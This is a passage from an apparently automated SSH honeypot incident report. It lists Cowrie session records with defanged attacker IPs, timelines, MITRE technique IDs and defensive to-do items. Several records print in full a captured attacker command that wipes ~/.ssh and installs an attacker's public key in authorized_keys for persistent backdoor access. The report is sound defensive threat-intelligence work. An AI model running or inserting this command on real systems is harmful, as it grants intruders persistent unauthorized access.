| **Source IP** | `154.217.253[.]190` |
| **First Seen** | 2026-06-09 09:51 |
| **Last Seen** | 2026-06-09 09:51 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:51:11` | `cowrie.session.connect` |
| `2026-06-09 09:51:11` | `cowrie.client.version` |
| `2026-06-09 09:51:11` | `cowrie.client.kex` |
| `2026-06-09 09:51:12` | `cowrie.login.success` |
| `2026-06-09 09:51:13` | `cowrie.session.params` |
| `2026-06-09 09:51:13` | `cowrie.command.input` |
| `2026-06-09 09:51:13` | `cowrie.command.failed` |
| `2026-06-09 09:51:13` | `cowrie.log.closed` |
| `2026-06-09 09:51:14` | `cowrie.session.params` |
| `2026-06-09 09:51:14` | `cowrie.command.input` |
| `2026-06-09 09:51:14` | `cowrie.session.file_download` |
| `2026-06-09 09:51:14` | `cowrie.log.closed` |
| `2026-06-09 09:51:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.217.253[.]190` to AbuseIPDB if not already reported
- [ ] Block `154.217.253[.]190` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f280e6167726

| Field | Detail |
|---|---|
| **Source IP** | `154.217.253[.]190` |
| **First Seen** | 2026-06-09 09:51 |
| **Last Seen** | 2026-06-09 09:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:51:17` | `cowrie.session.connect` |
| `2026-06-09 09:51:17` | `cowrie.client.version` |
| `2026-06-09 09:51:18` | `cowrie.client.kex` |
| `2026-06-09 09:51:19` | `cowrie.login.success` |
| `2026-06-09 09:51:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.217.253[.]190` to AbuseIPDB if not already reported
- [ ] Block `154.217.253[.]190` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ce538a94601

| Field | Detail |
|---|---|
| **Source IP** | `45.160.84[.]79` |
| **First Seen** | 2026-06-09 09:51 |
| **Last Seen** | 2026-06-09 09:51 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:51:35` | `cowrie.session.connect` |
| `2026-06-09 09:51:35` | `cowrie.client.version` |
| `2026-06-09 09:51:35` | `cowrie.client.kex` |
| `2026-06-09 09:51:36` | `cowrie.login.success` |
| `2026-06-09 09:51:37` | `cowrie.session.params` |
| `2026-06-09 09:51:37` | `cowrie.command.input` |
| `2026-06-09 09:51:37` | `cowrie.command.failed` |
| `2026-06-09 09:51:38` | `cowrie.log.closed` |
| `2026-06-09 09:51:38` | `cowrie.session.params` |
| `2026-06-09 09:51:38` | `cowrie.command.input` |
| `2026-06-09 09:51:38` | `cowrie.session.file_download` |
| `2026-06-09 09:51:38` | `cowrie.log.closed` |
| `2026-06-09 09:51:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.160.84[.]79` to AbuseIPDB if not already reported
- [ ] Block `45.160.84[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71619f0f3425

| Field | Detail |
|---|---|
| **Source IP** | `45.160.84[.]79` |
| **First Seen** | 2026-06-09 09:51 |
| **Last Seen** | 2026-06-09 09:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:51:42` | `cowrie.session.connect` |
| `2026-06-09 09:51:42` | `cowrie.client.version` |
| `2026-06-09 09:51:42` | `cowrie.client.kex` |
| `2026-06-09 09:51:44` | `cowrie.login.success` |
| `2026-06-09 09:51:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.160.84[.]79` to AbuseIPDB if not already reported
- [ ] Block `45.160.84[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8617e504286

| Field | Detail |
|---|---|
| **Source IP** | `81.192.46[.]49` |
| **First Seen** | 2026-06-09 09:52 |
| **Last Seen** | 2026-06-09 09:52 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:52:29` | `cowrie.session.connect` |
| `2026-06-09 09:52:29` | `cowrie.client.version` |
| `2026-06-09 09:52:29` | `cowrie.client.kex` |
| `2026-06-09 09:52:30` | `cowrie.login.success` |
| `2026-06-09 09:52:30` | `cowrie.session.params` |
| `2026-06-09 09:52:30` | `cowrie.command.input` |
| `2026-06-09 09:52:30` | `cowrie.command.failed` |
| `2026-06-09 09:52:30` | `cowrie.log.closed` |
| `2026-06-09 09:52:30` | `cowrie.session.params` |
| `2026-06-09 09:52:30` | `cowrie.command.input` |
| `2026-06-09 09:52:30` | `cowrie.session.file_download` |
| `2026-06-09 09:52:30` | `cowrie.log.closed` |
| `2026-06-09 09:52:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.192.46[.]49` to AbuseIPDB if not already reported
- [ ] Block `81.192.46[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d17c4c3e5838

| Field | Detail |
|---|---|
| **Source IP** | `81.192.46[.]49` |
| **First Seen** | 2026-06-09 09:52 |
| **Last Seen** | 2026-06-09 09:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:52:32` | `cowrie.session.connect` |
| `2026-06-09 09:52:32` | `cowrie.client.version` |
| `2026-06-09 09:52:33` | `cowrie.client.kex` |
| `2026-06-09 09:52:33` | `cowrie.login.success` |
| `2026-06-09 09:52:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.192.46[.]49` to AbuseIPDB if not already reported
- [ ] Block `81.192.46[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5aa8e3db75bd

| Field | Detail |
|---|---|
| **Source IP** | `154.217.253[.]190` |
| **First Seen** | 2026-06-09 09:53 |
| **Last Seen** | 2026-06-09 09:53 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:53:02` | `cowrie.session.connect` |
| `2026-06-09 09:53:02` | `cowrie.client.version` |
| `2026-06-09 09:53:02` | `cowrie.client.kex` |
| `2026-06-09 09:53:03` | `cowrie.login.success` |
| `2026-06-09 09:53:04` | `cowrie.session.params` |
| `2026-06-09 09:53:04` | `cowrie.command.input` |
| `2026-06-09 09:53:04` | `cowrie.command.failed` |
| `2026-06-09 09:53:04` | `cowrie.log.closed` |
| `2026-06-09 09:53:04` | `cowrie.session.params` |
| `2026-06-09 09:53:04` | `cowrie.command.input` |
| `2026-06-09 09:53:05` | `cowrie.session.file_download` |
| `2026-06-09 09:53:05` | `cowrie.log.closed` |
| `2026-06-09 09:53:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.217.253[.]190` to AbuseIPDB if not already reported
- [ ] Block `154.217.253[.]190` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-021609be8b74

| Field | Detail |
|---|---|
| **Source IP** | `154.217.253[.]190` |
| **First Seen** | 2026-06-09 09:53 |
| **Last Seen** | 2026-06-09 09:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:53:08` | `cowrie.session.connect` |
| `2026-06-09 09:53:08` | `cowrie.client.version` |
| `2026-06-09 09:53:08` | `cowrie.client.kex` |
| `2026-06-09 09:53:09` | `cowrie.login.success` |
| `2026-06-09 09:53:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.217.253[.]190` to AbuseIPDB if not already reported
- [ ] Block `154.217.253[.]190` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80071e2f7186

| Field | Detail |
|---|---|
| **Source IP** | `45.160.84[.]79` |
| **First Seen** | 2026-06-09 09:53 |
| **Last Seen** | 2026-06-09 09:53 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:53:44` | `cowrie.session.connect` |
| `2026-06-09 09:53:44` | `cowrie.client.version` |
| `2026-06-09 09:53:44` | `cowrie.client.kex` |
| `2026-06-09 09:53:45` | `cowrie.login.success` |
| `2026-06-09 09:53:46` | `cowrie.session.params` |
| `2026-06-09 09:53:46` | `cowrie.command.input` |
| `2026-06-09 09:53:46` | `cowrie.command.failed` |
| `2026-06-09 09:53:46` | `cowrie.log.closed` |
| `2026-06-09 09:53:47` | `cowrie.session.params` |
| `2026-06-09 09:53:47` | `cowrie.command.input` |
| `2026-06-09 09:53:47` | `cowrie.session.file_download` |
| `2026-06-09 09:53:47` | `cowrie.log.closed` |
| `2026-06-09 09:53:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.160.84[.]79` to AbuseIPDB if not already reported
- [ ] Block `45.160.84[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c17aa15b6507

| Field | Detail |
|---|---|
| **Source IP** | `45.160.84[.]79` |
| **First Seen** | 2026-06-09 09:53 |
| **Last Seen** | 2026-06-09 09:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:53:51` | `cowrie.session.connect` |
| `2026-06-09 09:53:51` | `cowrie.client.version` |
| `2026-06-09 09:53:51` | `cowrie.client.kex` |
| `2026-06-09 09:53:52` | `cowrie.login.success` |
| `2026-06-09 09:53:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.160.84[.]79` to AbuseIPDB if not already reported
- [ ] Block `45.160.84[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55a8d558eaa1

| Field | Detail |
|---|---|
| **Source IP** | `152.32.252[.]65` |
| **First Seen** | 2026-06-09 09:54 |
| **Last Seen** | 2026-06-09 09:54 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:54:04` | `cowrie.session.connect` |
| `2026-06-09 09:54:04` | `cowrie.client.version` |
| `2026-06-09 09:54:04` | `cowrie.client.kex` |
| `2026-06-09 09:54:05` | `cowrie.login.success` |
| `2026-06-09 09:54:05` | `cowrie.session.params` |
| `2026-06-09 09:54:05` | `cowrie.command.input` |
| `2026-06-09 09:54:05` | `cowrie.command.failed` |
| `2026-06-09 09:54:05` | `cowrie.log.closed` |
| `2026-06-09 09:54:05` | `cowrie.session.params` |
| `2026-06-09 09:54:05` | `cowrie.command.input` |
| `2026-06-09 09:54:05` | `cowrie.session.file_download` |
| `2026-06-09 09:54:05` | `cowrie.log.closed` |
| `2026-06-09 09:54:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.252[.]65` to AbuseIPDB if not already reported
- [ ] Block `152.32.252[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1added0bec88

| Field | Detail |
|---|---|
| **Source IP** | `152.32.252[.]65` |
| **First Seen** | 2026-06-09 09:54 |
| **Last Seen** | 2026-06-09 09:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:54:07` | `cowrie.session.connect` |
| `2026-06-09 09:54:07` | `cowrie.client.version` |
| `2026-06-09 09:54:07` | `cowrie.client.kex` |
| `2026-06-09 09:54:08` | `cowrie.login.success` |
| `2026-06-09 09:54:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.252[.]65` to AbuseIPDB if not already reported
- [ ] Block `152.32.252[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06b89f6510da

| Field | Detail |
|---|---|
| **Source IP** | `43.166.137[.]151` |
| **First Seen** | 2026-06-09 09:54 |
| **Last Seen** | 2026-06-09 09:54 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:54:12` | `cowrie.session.connect` |
| `2026-06-09 09:54:12` | `cowrie.client.version` |
| `2026-06-09 09:54:12` | `cowrie.client.kex` |
| `2026-06-09 09:54:13` | `cowrie.login.success` |
| `2026-06-09 09:54:13` | `cowrie.session.params` |
| `2026-06-09 09:54:13` | `cowrie.command.input` |
| `2026-06-09 09:54:13` | `cowrie.command.failed` |
| `2026-06-09 09:54:14` | `cowrie.log.closed` |
| `2026-06-09 09:54:14` | `cowrie.session.params` |
| `2026-06-09 09:54:14` | `cowrie.command.input` |
| `2026-06-09 09:54:14` | `cowrie.session.file_download` |
| `2026-06-09 09:54:14` | `cowrie.log.closed` |
| `2026-06-09 09:54:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.166.137[.]151` to AbuseIPDB if not already reported
- [ ] Block `43.166.137[.]151` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab128e16c94d

| Field | Detail |
|---|---|
| **Source IP** | `43.166.137[.]151` |
| **First Seen** | 2026-06-09 09:54 |
| **Last Seen** | 2026-06-09 09:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:54:17` | `cowrie.session.connect` |
| `2026-06-09 09:54:17` | `cowrie.client.version` |
| `2026-06-09 09:54:18` | `cowrie.client.kex` |
| `2026-06-09 09:54:19` | `cowrie.login.success` |
| `2026-06-09 09:54:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.166.137[.]151` to AbuseIPDB if not already reported
- [ ] Block `43.166.137[.]151` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a9bb563117b

| Field | Detail |
|---|---|
| **Source IP** | `45.160.84[.]79` |
| **First Seen** | 2026-06-09 09:55 |
| **Last Seen** | 2026-06-09 09:56 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:55:55` | `cowrie.session.connect` |
| `2026-06-09 09:55:55` | `cowrie.client.version` |
| `2026-06-09 09:55:55` | `cowrie.client.kex` |
| `2026-06-09 09:55:56` | `cowrie.login.success` |
| `2026-06-09 09:55:57` | `cowrie.session.params` |
| `2026-06-09 09:55:57` | `cowrie.command.input` |
| `2026-06-09 09:55:57` | `cowrie.command.failed` |
| `2026-06-09 09:55:58` | `cowrie.log.closed` |
| `2026-06-09 09:55:58` | `cowrie.session.params` |
| `2026-06-09 09:55:58` | `cowrie.command.input` |
| `2026-06-09 09:55:58` | `cowrie.session.file_download` |
| `2026-06-09 09:55:58` | `cowrie.log.closed` |
| `2026-06-09 09:56:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.160.84[.]79` to AbuseIPDB if not already reported
- [ ] Block `45.160.84[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-477c31ab4fe1

| Field | Detail |
|---|---|
| **Source IP** | `45.160.84[.]79` |
| **First Seen** | 2026-06-09 09:56 |
| **Last Seen** | 2026-06-09 09:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:56:02` | `cowrie.session.connect` |
| `2026-06-09 09:56:02` | `cowrie.client.version` |
| `2026-06-09 09:56:02` | `cowrie.client.kex` |
| `2026-06-09 09:56:04` | `cowrie.login.success` |
| `2026-06-09 09:56:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.160.84[.]79` to AbuseIPDB if not already reported
- [ ] Block `45.160.84[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7a81546fe91

| Field | Detail |
|---|---|
| **Source IP** | `81.192.46[.]49` |
| **First Seen** | 2026-06-09 09:57 |
| **Last Seen** | 2026-06-09 09:57 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:57:45` | `cowrie.session.connect` |
| `2026-06-09 09:57:45` | `cowrie.client.version` |
